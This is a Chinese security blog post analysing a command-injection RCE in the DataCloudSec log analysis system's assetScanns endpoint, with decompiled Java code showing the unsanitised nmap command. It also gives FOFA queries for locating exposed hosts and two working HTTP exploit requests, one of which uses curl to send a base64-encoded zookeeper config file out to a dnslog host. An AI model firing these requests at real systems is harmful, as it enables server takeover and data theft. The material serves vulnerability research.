---
title: "安数云综合日志分析系统 assetScanns 命令执行漏洞"
source: https://mrxn.net/jswz/datacloudsec-assetTopo-assetScanns-rce.html
asset_dir: assets/安数云综合日志分析系统-assetscanns-命令执行漏洞
---

# 安数云综合日志分析系统 assetScanns 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/27 08:31
* 810浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

服务器

SQL

honeypot


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

安数云日志审计系统是安数云公司自主研发的专业日志安全审计产品。该系统可以实时监视网络中的各种操作行为和攻击信息，通过事件监控模块监控网络设备、主机系统等的日志信息，及时发现正在发生和已经发生的安全事件，并通过响应模块采取措施，确保网络和业务系统的安全。安数云综合日志分析系统的 /assetTopo/assetScanns 接口存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该漏洞在服务器端执行任意命令，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞修复方案

# 影响版本

# fofa语法

> (fid="ABUp4kzJ+itzKQ+J4McbEw==") && (is\_honeypot=false && is\_fraud=false)
>
> (icon\_hash="829311222" || icon\_hash="-2008445303") && (is\_honeypot=false && is\_fraud=false)

# 漏洞分析

漏洞触发位置在`com.datacloudsec.web.asset.controller.AssetTopoController`中,看下有关**assetScanns**的处理逻辑

```
@RequestMapping({"/assetScanns"})
  @FuncAuthIntercept
  public Object assetScanns(@RequestParam("ip") String ip, @RequestParam("port") String port) {
    this.lastScanConfig = new ScanConfigBean(ip, port);
    FileKit.ensureDirExist(this.webConfig.getOutputPath());
    String outputPath = FileKit.absolutePath(this.webConfig.getOutputPath() + File.separatorChar + "nmap_output.xml");
    boolean result = this.assetScannService.assetScann(outputPath, ip, port);
    if (!result)
      return WebKit.okMap("error"); 
    return WebKit.okMap();
  }
```

深入探索

文本剥离工具

企业安全咨询

文件大小转换

参数**ip**和**port**被带入**assetScann**方法中

```
public boolean assetScann(String fileSrc, String ip, String port) {
    String nmapDir = "nmap ";
    StringBuffer command = new StringBuffer();
    if (null == port || port.trim().equals("")) {
      command.append("-sV ");
    } else {
      command.append("-sV -p ");
      command.append(port);
      command.append(" ");
    } 
    command.append(ip);
    command.append(" --open --min-hostgroup 1024 --min-parallelism 10 --host-timeout 30 -O -T4 -oX ");
    boolean scannBool = true;
    try {
      scannBool = getScannXmlFile(nmapDir, command.toString(), fileSrc);
    } catch (IOException e) {
      logger.info("Scann Error");
    } 
    return scannBool;
  }
```

深入探索

编程语言教程

授权

网页浏览器

如果参数**port不为空或者null**这在拼接在`command`中 `-sV -p port`，然后再将`ip`拼接在后面，最后进入**getScannXmlFile**方法中

```
private boolean getScannXmlFile(String nmapDir, String command, String fileSrc) throws IOException {
    logger.info("scann host =============:" + nmapDir + command + fileSrc);
    (new Thread(() -> CmdKit.execute(nmapDir + command + fileSrc))).start();
    return true;
  }
```

调用**CmdKit.execute**执行上面拼接的命令

安全运维咨询

```
public static boolean execute(String cmd) {
    String result = executeForStr(cmd);
    return !"EXECUTE_ERROR".equals(result);
  }
```

跟进**executeForStr**方法，其中对针对不同的系统使用 `cmd /c` 或者 `/bin/sh` 调用**Runtime.getRuntime().exec**[执行最终的命令](https://mrxn.net/tag/rce)

```
 public static String executeForStr(String cmd) {
    if (StringUtils.isBlank(cmd))
      return "EXECUTE_ERROR"; 
    BufferedReader bufferedReader = null;
    try {
      StringBuilder output = new StringBuilder(100);
      String[] cmdString = new String[3];
      if (isWindowsOS()) {
        cmdString[0] = "cmd.exe";
        cmdString[1] = "/C";
      } else {
        cmdString[0] = "/bin/sh";
        cmdString[1] = "-c";
      } 
      cmdString[2] = cmd;
      Process process = Runtime.getRuntime().exec(cmdString);
      bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      String line;
      while ((line = bufferedReader.readLine()) != null)
        output.append(line); 
      logger.info("cmd is [{}]", cmd);
      logger.info("cmd result is [{}]", output.toString());
      int exitValue = process.waitFor();
      if (exitValue != 0)
        logger.error("executeForStr failure, exitValue is {}!", Integer.valueOf(exitValue)); 
      return output.toString();
    } catch (Exception e) {
      logger.error(e.getMessage());
      return "EXECUTE_ERROR";
    } finally {
      IOUtils.closeQuietly(bufferedReader);
    } 
  }
```

至此，可以看到整个流程都没有对传入的参数**ip**和**port**进行校验或者过滤，因此造成[命令注入](https://mrxn.net/tag/rce)漏洞。

该系统还存在几处需要adm权限（登录后）的[命令注入](https://mrxn.net/tag/rce)点，由于需要权限，暂不赘述。

计算机服务器

# 漏洞复现

[![安数云综合日志分析系统 assetScanns 命令执行漏洞](images/img-001-1a4329c41cea.webp)](https://image.mrxn.net/bae127872ddf4256b215b72dc9c522fd.webp)

```
POST /js/..;/assetTopo/assetScanns HTTP/1.1
Host: datacloudsec.mrxn.net
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1;curl xxx.xx.xxx.dnslog.pt;&port=80
```

[命令执行](https://mrxn.net/tag/rce)结果外带

黑客与破解

```
POST /js/..;/assetTopo/assetScanns HTTP/1.1
Host: datacloudsec.mrxn.net
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1;curl xxx.xx.xxx.dnslog.pt -d `cat /opt/software/zookeeper/conf/zoo.cfg |base64 -w 0`;&port=80
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[安数云综合日志分析系统 assetScanns 命令执行漏洞](https://mrxn.net/jswz/datacloudsec-assetTopo-assetScanns-rce.html)  
文章链接：<https://mrxn.net/jswz/datacloudsec-assetTopo-assetScanns-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/datacloudsec-assetTopo-assetScanns-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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